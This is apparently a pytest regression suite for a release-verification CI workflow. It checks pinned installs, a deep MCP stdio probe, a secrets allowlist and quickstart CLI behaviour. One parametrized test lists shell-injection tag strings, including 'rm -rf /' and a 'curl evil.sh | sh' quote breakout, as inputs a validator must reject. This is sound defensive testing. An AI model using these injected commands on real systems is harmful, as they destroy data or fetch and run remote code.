"""Offline regression tests for the tag-release verification workflow — DF-CHIMERA-0911-2.

The release-verify job in .github/workflows/ci.yml is the last gate before a
tagged release is considered good. It previously installed the UNPINNED
package (``pip install "chimera-deliberation[full]"`` — which can resolve a
newer/wrong version than the tag that triggered the run) and its MCP check
was a handshake-only ``... | head -1 | grep serverInfo`` that falsely passed
the published 0.2.3 wheel, whose lazy LiteLLM stdout pollution only begins
on a real tools/call.

These tests pin the workflow contract OFFLINE — no GitHub runner, no PyPI,
no provider keys:

* the install is exact-version pinned (``==${VERSION}``) from the tag, in a
  fresh venv, behind a BOUNDED retry that cannot fall through to another
  version, with a post-install ``chimera.__version__ == VERSION`` assertion;
* the MCP gate drives scripts/probe_mcp_stdio.py against the fresh venv's
  chimera-mcp at real tools/call depth for BOTH gate formations
  (simple + speed), and no head -1 / serverInfo handshake survives;
* the fresh-user journey (config init + real CLI run with the deterministic
  GATE-OK merged-answer assertion) is intact;
* the 0.2.3 lazy-pollution shape is replayed through the probe's real
  validators: the OLD shallow gate accepts it, the NEW gate rejects it;
* the README-documented quickstart CLI SURFACE is asserted against the
  published artifact (scripts/quickstart_battery.py) and the 0.2.5 shape —
  a wheel whose CLI rejects ``--version`` — is replayed against it (the
  battery must exit 1 and name the failing check);
* every ``secrets.*`` reference in the workflow is inside a documented
  allowlist (DF-CHIMERA-0917-5): the 0.2.6 MCP gate exported
  ``secrets.OPENROUTER_API_KEY``, which does not exist in the repository, so
  GitHub substituted it with an empty string and the step ran
  half-configured — silently, until the probe failed on an unsatisfiable
  formation;
* scripts/release_expected_version.py derives/validates the version offline.
"""

from __future__ import annotations

import importlib.util
import json
import re
import shlex
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
WORKFLOW_PATH = REPO / ".github" / "workflows" / "ci.yml"
PROBE_PATH = REPO / "scripts" / "probe_mcp_stdio.py"
VERSION_SCRIPT_PATH = REPO / "scripts" / "release_expected_version.py"
QUICKSTART_PATH = REPO / "scripts" / "quickstart_battery.py"


def _load_module(name: str, path: Path) -> ModuleType:
    """Load a script as a module (scripts/ is not a package)."""
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


probe = _load_module("probe_mcp_stdio", PROBE_PATH)
release_version = _load_module("release_expected_version", VERSION_SCRIPT_PATH)
quickstart = _load_module("quickstart_battery", QUICKSTART_PATH)


@pytest.fixture(scope="module")
def workflow() -> dict:
    with WORKFLOW_PATH.open(encoding="utf-8") as fh:
        doc = yaml.safe_load(fh)
    assert isinstance(doc, dict), "ci.yml must parse as a mapping"
    return doc


@pytest.fixture(scope="module")
def release_verify_steps(workflow: dict) -> list[dict]:
    job = workflow["jobs"]["release-verify"]
    assert job["needs"] == "publish", "release-verify must run only after publish"
    assert "refs/tags/v" in job["if"], "release-verify must be tag-triggered"
    return job["steps"]


@pytest.fixture(scope="module")
def release_verify_run_blocks(release_verify_steps: list[dict]) -> str:
    """All run blocks of release-verify, concatenated for contract greps."""
    return "\n".join(step.get("run", "") for step in release_verify_steps)


# --- exact-version pinning -------------------------------------------------- #


def test_install_is_exact_version_pinned(release_verify_run_blocks: str) -> None:
    """The published artifact is installed as ==$VERSION, never unpinned."""
    assert 'chimera-deliberation[full]==${VERSION}' in release_verify_run_blocks
    # No bare/unpinned install of the package may survive anywhere in the job.
    unpinned = re.findall(r'pip install\s+"chimera-deliberation\[full\]"', release_verify_run_blocks)
    assert not unpinned, f"unpinned install survived: {unpinned}"


def test_version_derived_from_tag_via_validating_script(release_verify_run_blocks: str) -> None:
    """VERSION comes from the tag through the validating helper, not raw ref."""
    derive = 'VERSION=$(python scripts/release_expected_version.py "${GITHUB_REF_NAME}")'
    assert derive in release_verify_run_blocks
    assert 'echo "VERSION=${VERSION}" >> "$GITHUB_ENV"' in release_verify_run_blocks


def test_post_install_asserts_imported_version_equals_tag(release_verify_run_blocks: str) -> None:
    """Belt-and-braces: the imported package version must BE the tag version."""
    assert "chimera.__version__" in release_verify_run_blocks
    assert "== '${VERSION}'" in release_verify_run_blocks


# --- bounded publish-availability retry -------------------------------------- #


def test_install_retry_is_bounded_and_cannot_fall_through(release_verify_run_blocks: str) -> None:
    """Retry loop is finite, sleeps between attempts, and fails loudly."""
    match = re.search(r"for attempt in \$\(seq 1 (\d+)\)", release_verify_run_blocks)
    assert match, "install step must retry via a bounded seq loop"
    attempts = int(match.group(1))
    assert 1 < attempts <= 40, f"retry bound {attempts} must be finite and sane"
    assert re.search(r"sleep \d+", release_verify_run_blocks), "retry loop must sleep between attempts"
    # After the loop, an unmet install is a hard failure — never a silent pass.
    assert "never became installable" in release_verify_run_blocks
    assert "exit 1" in release_verify_run_blocks
    # The pinned requirement appears INSIDE the loop (every attempt exact).
    loop = release_verify_run_blocks[match.start() :]
    loop = loop[: loop.index("done")]
    assert 'chimera-deliberation[full]==${VERSION}' in loop


# --- deep MCP probe invocation ----------------------------------------------- #


def test_mcp_gate_uses_deep_probe_against_fresh_venv(release_verify_run_blocks: str) -> None:
    """The MCP gate runs the real-depth probe on the installed artifact."""
    assert "python scripts/probe_mcp_stdio.py" in release_verify_run_blocks
    assert "/tmp/release-venv/bin/chimera-mcp" in release_verify_run_blocks


def test_mcp_gate_probes_both_gate_formations(release_verify_run_blocks: str) -> None:
    """The 0.2.3 leak was formation-dependent — simple AND speed are probed."""
    mcp_bin = "/tmp/release-venv/bin/chimera-mcp"
    simple = re.search(rf"probe_mcp_stdio\.py --formation=simple {mcp_bin}", release_verify_run_blocks)
    speed = re.search(rf"probe_mcp_stdio\.py --formation=speed {mcp_bin}", release_verify_run_blocks)
    assert simple, "probe must run with --formation=simple"
    assert speed, "probe must run with --formation=speed (the 0.2.3 leaky leg)"


def test_no_shallow_handshake_survives(release_verify_run_blocks: str) -> None:
    """The falsely-green 0.2.3-era handshake check must be gone."""
    assert "head -1" not in release_verify_run_blocks
    assert "serverInfo" not in release_verify_run_blocks


def test_mcp_gate_carries_provider_keys(release_verify_steps: list[dict]) -> None:
    """A real tools/call needs a provider key in the step env."""
    probe_steps = [s for s in release_verify_steps if "probe_mcp_stdio" in s.get("run", "")]
    assert probe_steps, "no probe step found"
    env = probe_steps[0].get("env", {})
    assert "DEEPSEEK_API_KEY" in env


# --- secret allowlist (DF-CHIMERA-0917-5) ------------------------------------ #
#
# CI run 35224141038 (tag v0.2.6): the release-verify MCP gate exported
# ``OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}`` — a secret that does
# NOT exist in this repository (``gh secret list`` returns exactly
# DEEPSEEK_API_KEY and PYPI_TOKEN). GitHub substitutes a missing secret as an
# EMPTY string with no warning, so the step looked configured while the probe
# drove a formation whose OpenRouter worker could never be satisfied. Two guards
# here: the allowlist pins what the workflow may reference, and the probe step
# must exercise the probe's own config provisioning (no --config/--cwd), which
# is what makes the gate independent of the untracked repo-root chimera.yaml.

#: Secrets that exist on the repo. ADDING A REFERENCE REQUIRES CREATING THE
#: SECRET IN THE REPOSITORY FIRST (Settings → Secrets → Actions), then extending
#: this set deliberately — a typo'd/dangling ``secrets.X`` is silently empty.
ALLOWED_SECRETS = {"DEEPSEEK_API_KEY", "PYPI_TOKEN"}


def test_every_secret_reference_is_in_the_documented_allowlist() -> None:
    """No ``secrets.*`` reference outside the allowlist (recurrence guard)."""
    text = WORKFLOW_PATH.read_text(encoding="utf-8")
    used = set(re.findall(r"secrets\.([A-Za-z0-9_]+)", text))
    assert used, "no secrets.* reference found — the workflow changed shape"
    unknown = used - ALLOWED_SECRETS
    assert not unknown, (
        f"ci.yml references secret(s) that do not exist in the repository: {sorted(unknown)}. "
        f"GitHub substitutes a missing secret as an empty string, so the step would run "
        f"half-configured; create the secret first, then add it to ALLOWED_SECRETS."
    )


def test_mcp_probe_step_does_not_depend_on_a_nonexistent_secret() -> None:
    """The exact defect: the probe step must not export OPENROUTER_API_KEY."""
    step = next(
        s for s in _release_verify_job_steps() if "probe_mcp_stdio" in s.get("run", "")
    )
    env = step.get("env") or {}
    assert "OPENROUTER_API_KEY" not in env, (
        "the repo has no OPENROUTER_API_KEY secret; the probe remaps uncredentialed "
        "models onto DEEPSEEK_API_KEY instead (printing each substitution)"
    )
    assert set(env) <= ALLOWED_SECRETS, f"unexpected probe-step env: {sorted(env)}"


def test_mcp_probe_step_exercises_the_self_provisioning_default() -> None:
    """No --config/--cwd in the gate: the provisioned-config path is what CI runs.

    Passing a path would test the operator path instead of the default one that
    a fresh checkout (no untracked chimera.yaml) actually takes.
    """
    step = next(
        s for s in _release_verify_job_steps() if "probe_mcp_stdio" in s.get("run", "")
    )
    run = step["run"]
    assert "--config=" not in run and "--cwd=" not in run
    assert "provisions its OWN config" in run, (
        "the step must document that it no longer depends on the repo-root chimera.yaml"
    )


def _release_verify_job_steps() -> list[dict]:
    with WORKFLOW_PATH.open(encoding="utf-8") as fh:
        doc = yaml.safe_load(fh)
    return doc["jobs"]["release-verify"]["steps"]


# --- fresh-user journey ------------------------------------------------------- #


def test_fresh_user_journey_is_intact(release_verify_run_blocks: str) -> None:
    """config init + a real CLI deliberation with a deterministic assertion."""
    assert "/tmp/release-venv/bin/chimera config init" in release_verify_run_blocks
    assert "test -f chimera.yaml" in release_verify_run_blocks
    assert '/tmp/release-venv/bin/chimera run "Reply with exactly: GATE-OK"' in release_verify_run_blocks
    assert 'grep -q "GATE-OK" /tmp/gate_run.out' in release_verify_run_blocks


# --- 0.2.3 lazy-pollution replay ---------------------------------------------- #

_INIT_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "protocolVersion": "2025-03-26",
            "capabilities": {"tools": {}},
            "serverInfo": {"name": "chimera-mcp", "version": "0.2.3"},
        },
    }
)
_TOOLS_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 2,
        "result": {
            "tools": [
                {"name": "chimera_deliberate"},
                {"name": "chimera_formations"},
                {"name": "chimera_models"},
            ]
        },
    }
)
_DEPTH_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 3,
        "result": {"content": [{"type": "text", "text": json.dumps({"answer": "17 * 23 = 391"})}]},
    }
)
#: The banner LiteLLM printed to stdout on the OpenRouter leg in the 0.2.3
#: wheel — AFTER a clean handshake, only once a real deliberation ran.
_LITELLM_BANNER = "\x1b[1;36mProvider List: https://docs.litellm.ai/docs/providers\x1b[0m"


def _old_shallow_gate_passes(stdout_lines: list[str]) -> bool:
    """Replay the 0.2.3-era check: first stdout line greps serverInfo."""
    return bool(stdout_lines) and '"serverInfo"' in stdout_lines[0]


def test_023_shape_fools_the_old_gate_but_fails_the_new_one() -> None:
    """The known 0.2.3 lazy-pollution shape: handshake pure, depth polluted.

    The old initialize-only gate ACCEPTS this transcript; the probe's real
    validators REJECT it — this is the failure signal the release canary
    must produce on any lazy stdout pollution.
    """
    polluted_at_depth = [_INIT_RESPONSE, _TOOLS_RESPONSE, _LITELLM_BANNER, _DEPTH_RESPONSE]

    assert _old_shallow_gate_passes(polluted_at_depth), (
        "premise broken: the old head -1 | grep serverInfo gate should ACCEPT this 0.2.3 transcript"
    )

    order, responses = probe.collect_responses(polluted_at_depth)
    problems = probe.check_handshake(polluted_at_depth, order, responses)
    depth_problems, _ = probe.check_depth_result(responses.get(3, {}).get("result", {}))
    problems.extend(depth_problems)
    assert problems, "the deep probe must REJECT the 0.2.3 lazy-pollution transcript"
    assert any("non-JSON-RPC stdout lines" in p for p in problems), (
        f"expected a stdout-pollution finding, got: {problems}"
    )


def test_probe_clean_transcript_passes_both_validators() -> None:
    """Control: a pure transcript (what a fixed wheel emits) passes cleanly."""
    clean = [_INIT_RESPONSE, _TOOLS_RESPONSE, _DEPTH_RESPONSE]
    assert _old_shallow_gate_passes(clean)
    order, responses = probe.collect_responses(clean)
    problems = probe.check_handshake(clean, order, responses)
    depth_problems, _ = probe.check_depth_result(responses.get(3, {}).get("result", {}))
    problems.extend(depth_problems)
    assert problems == [], f"clean transcript must pass, got: {problems}"


# --- release_expected_version.py contract ------------------------------------- #


def test_derive_version_strips_v_and_validates() -> None:
    assert release_version.derive_version("v0.2.5") == "0.2.5"
    assert release_version.derive_version("v1.0.0rc1") == "1.0.0rc1"


@pytest.mark.parametrize(
    "bad_tag",
    [
        "0.2.5",  # missing v prefix
        "v",  # empty version
        "v0.2.5; rm -rf /",  # shell injection
        'v0.2.5" && curl evil.sh | sh #',  # quote breakout
        "v0.2.5 || true",  # command chaining
        "vlatest",  # not a version
        "v0.2.5+local",  # local segment not accepted
        "",  # empty tag
    ],
)
def test_derive_version_rejects_unsafe_tags(bad_tag: str) -> None:
    with pytest.raises(ValueError):
        release_version.derive_version(bad_tag)


def test_expected_version_matches_this_repo_pyproject() -> None:
    """The tag built from pyproject's own version must round-trip."""
    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    assert release_version.is_safe_pep440(declared)
    assert release_version.expected_version(f"v{declared}") == declared


def test_expected_version_rejects_tag_pyproject_mismatch(tmp_path: Path) -> None:
    """A tag that doesn't match the declared version is a hard failure."""
    fake = tmp_path / "pyproject.toml"
    fake.write_text('[project]\nname = "chimera-deliberation"\nversion = "9.9.9"\n', encoding="utf-8")
    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    with pytest.raises(ValueError, match="does not match|declares"):
        release_version.expected_version(f"v{declared}", fake)


# --- README quickstart CLI surface vs the published artifact (DF-CHIMERA-0916B-3) -- #

#: Offline stand-in for an installed ``chimera`` console script. Both
#: ``bin/chimera`` and ``bin/python`` get this body, because the battery drives
#: the console script directly AND the interpreter as ``python -m chimera``.
_FAKE_CLI_TEMPLATE = '''#!/usr/bin/env python3
"""Offline stand-in for the installed chimera console script (test fixture)."""
import sys

VERSION = __VERSION__
ACCEPTS_VERSION = __ACCEPTS_VERSION__
ARGS = sys.argv[1:]

if "--version" in ARGS:
    if not ACCEPTS_VERSION:
        print("Usage: chimera [OPTIONS] [COMMAND] [ARGS]...", file=sys.stderr)
        print(
            "Error: No such option '--version'. (Did you mean one of: "
            "'--formation', '--verbose'?)",
            file=sys.stderr,
        )
        raise SystemExit(2)
    print("chimera " + VERSION)
    raise SystemExit(0)
if "--help" in ARGS:
    print("Usage: chimera [OPTIONS] [COMMAND] [ARGS]...")
    raise SystemExit(0)
if ARGS[:2] == ["config", "init"]:
    with open("chimera.yaml", "w", encoding="utf-8") as fh:
        fh.write("server: {}\\n")
    print("Created chimera.yaml")
    raise SystemExit(0)
print("unexpected args: %r" % (ARGS,), file=sys.stderr)
raise SystemExit(9)
'''


def _make_fake_venv(
    tmp_path: Path, *, accepts_version: bool = True, version: str = "0.2.5"
) -> Path:
    """A venv-shaped directory whose CLI entry points are the offline stand-in."""
    venv = tmp_path / "fake-venv"
    (venv / "bin").mkdir(parents=True, exist_ok=True)
    body = _FAKE_CLI_TEMPLATE.replace("__VERSION__", repr(version)).replace(
        "__ACCEPTS_VERSION__", repr(accepts_version)
    )
    for name in ("chimera", "python"):
        entry = venv / "bin" / name
        entry.write_text(body, encoding="utf-8")
        entry.chmod(0o755)
    return venv


def _run_battery(*args: str) -> subprocess.CompletedProcess:
    """Run the battery as a real process — its exit codes ARE the contract."""
    return subprocess.run(
        [sys.executable, str(QUICKSTART_PATH), *args],
        capture_output=True,
        text=True,
        cwd=REPO,
        timeout=120,
    )


def test_battery_wired_into_release_verify_after_the_pinned_install(
    release_verify_steps: list[dict],
) -> None:
    """The battery runs against the pinned published venv with the tag version."""
    indices = [
        i for i, step in enumerate(release_verify_steps) if "quickstart_battery.py" in step.get("run", "")
    ]
    assert len(indices) == 1, f"expected exactly one quickstart-battery step, found {indices}"
    step_index = indices[0]
    command_line = next(
        line.strip()
        for line in release_verify_steps[step_index]["run"].splitlines()
        if "quickstart_battery.py" in line
    )
    assert shlex.split(command_line) == [
        "python",
        "scripts/quickstart_battery.py",
        "--venv",
        "/tmp/release-venv",
        "--expected-version",
        "${VERSION}",
    ], f"battery must target the pinned release venv + tag-derived version, got {command_line!r}"

    install_index = next(
        i
        for i, step in enumerate(release_verify_steps)
        if "chimera-deliberation[full]==${VERSION}" in step.get("run", "")
    )
    e2e_index = next(
        i for i, step in enumerate(release_verify_steps) if "GATE-OK" in step.get("run", "")
    )
    assert install_index < step_index < e2e_index, (
        "the surface battery must run AFTER the pinned install and BEFORE the "
        f"E2E run (install={install_index}, battery={step_index}, e2e={e2e_index})"
    )


def test_battery_step_needs_no_provider_keys(release_verify_steps: list[dict]) -> None:
    """Every battery check is local, so its step must not carry secrets/keys."""
    step = next(s for s in release_verify_steps if "quickstart_battery.py" in s.get("run", ""))
    assert not step.get("env"), f"quickstart battery must be keyless, got env={step.get('env')}"


def test_battery_rejects_the_shipped_0_2_5_cli_surface(tmp_path: Path) -> None:
    """RED shape of the 0.2.5 wheel: the CLI rejects ``--version``.

    The published 0.2.5 wheel exits 2 with "Error: No such option '--version'."
    for BOTH documented forms while ``--help`` and ``config init`` still work —
    the battery must therefore fail, exit 1, and NAME the failing checks.
    """
    venv = _make_fake_venv(tmp_path, accepts_version=False)
    proc = _run_battery("--venv", str(venv), "--expected-version", "0.2.5")
    assert proc.returncode == 1, (
        f"a CLI without --version must fail the battery, got {proc.returncode}\n"
        f"stdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
    )
    assert "[FAIL] cli-version" in proc.stdout, proc.stdout
    assert "[FAIL] module-version" in proc.stdout, proc.stdout
    assert "No such option" in proc.stdout, proc.stdout
    assert "QUICKSTART BATTERY FAIL" in proc.stdout
    # The two checks the shipped 0.2.5 wheel DID pass stay reported as passing.
    assert "[PASS] cli-help" in proc.stdout
    assert "[PASS] config-init" in proc.stdout


def test_battery_passes_on_a_conforming_cli(tmp_path: Path) -> None:
    """GREEN control: the documented surface works -> exit 0, 4/4 checks."""
    venv = _make_fake_venv(tmp_path)
    proc = _run_battery("--venv", str(venv), "--expected-version", "0.2.5")
    assert proc.returncode == 0, f"conforming CLI must pass\n{proc.stdout}\n{proc.stderr}"
    assert "CHECKS_PASSED=4 CHECKS_FAILED=0" in proc.stdout
    assert "QUICKSTART BATTERY OK" in proc.stdout
    assert "created chimera.yaml" in proc.stdout


def test_battery_rejects_a_cli_reporting_another_version(tmp_path: Path) -> None:
    """Accepting ``--version`` is not enough: the version must BE the expected one."""
    venv = _make_fake_venv(tmp_path, version="0.2.4")
    proc = _run_battery("--venv", str(venv), "--expected-version", "0.2.5")
    assert proc.returncode == 1, f"wrong version must fail the battery\n{proc.stdout}"
    assert "[FAIL] cli-version" in proc.stdout
    assert "output lacks version '0.2.5'" in proc.stdout


@pytest.mark.parametrize(
    "args",
    [
        (),  # --expected-version is required
        ("--venv", "/tmp"),  # venv given, version missing
        ("--expected-version", ""),  # blank value
        ("--expected-version", "0.2.5", "--bogus"),  # unknown option
        ("--expected-version", "0.2.5", "--venv"),  # missing option value
        ("--expected-version", "0.2.5", "--venv", "/nonexistent-venv-0916b3"),  # not a dir
        ("--expected-version", "0.2.5", "positional"),  # unexpected positional
    ],
)
def test_battery_usage_errors_exit_2(args: tuple[str, ...]) -> None:
    """Documented exit contract: bad input is 2 — never 1 and never a traceback."""
    proc = _run_battery(*args)
    assert proc.returncode == 2, (
        f"expected usage exit 2 for {args}, got {proc.returncode}\n{proc.stdout}\n{proc.stderr}"
    )
    assert "usage error" in proc.stderr, proc.stderr
    assert "Traceback" not in proc.stderr, proc.stderr


def test_battery_check_inventory_follows_the_readme(tmp_path: Path) -> None:
    """The four README quickstart assertions, in documented order."""
    checks = quickstart.build_checks(tmp_path)
    assert [c.name for c in checks] == ["cli-version", "module-version", "cli-help", "config-init"]
    assert checks[0].version_expected and checks[1].version_expected
    assert not checks[2].version_expected
    assert checks[3].expect_file == "chimera.yaml"


def test_battery_runs_every_check_in_a_fresh_temp_cwd(tmp_path: Path) -> None:
    """No quickstart command may run in the caller's cwd (never the repo root)."""
    probe = tmp_path / "print_cwd.py"
    probe.write_text(
        "import os, sys\nwith open(sys.argv[1], 'w', encoding='utf-8') as fh:\n    fh.write(os.getcwd())\n",
        encoding="utf-8",
    )
    recorded_path = tmp_path / "cwd.txt"
    check = quickstart.Check(
        "cwd-probe", [sys.executable, str(probe), str(recorded_path)], "records the child cwd"
    )
    result = quickstart.run_check(check, "0.2.5")
    assert result.ok, result.detail
    recorded = recorded_path.read_text(encoding="utf-8")
    assert recorded != str(REPO), "the battery ran a check in the repo root"
    assert Path(recorded).name.startswith("chimera-quickstart-"), recorded
    assert not Path(recorded).exists(), "the temp cwd must be cleaned up"


def test_battery_version_token_match_is_boundary_anchored() -> None:
    """``0.2.5`` must not be satisfied by 0.2.50 / 0.2.5rc1 / 10.2.5."""
    assert quickstart.version_token_present("chimera 0.2.5\n", "0.2.5")
    assert quickstart.version_token_present("chimera 0.2.5 (python 3.11)", "0.2.5")
    assert not quickstart.version_token_present("chimera 0.2.50\n", "0.2.5")
    assert not quickstart.version_token_present("chimera 0.2.5rc1\n", "0.2.5")
    assert not quickstart.version_token_present("chimera 10.2.5\n", "0.2.5")
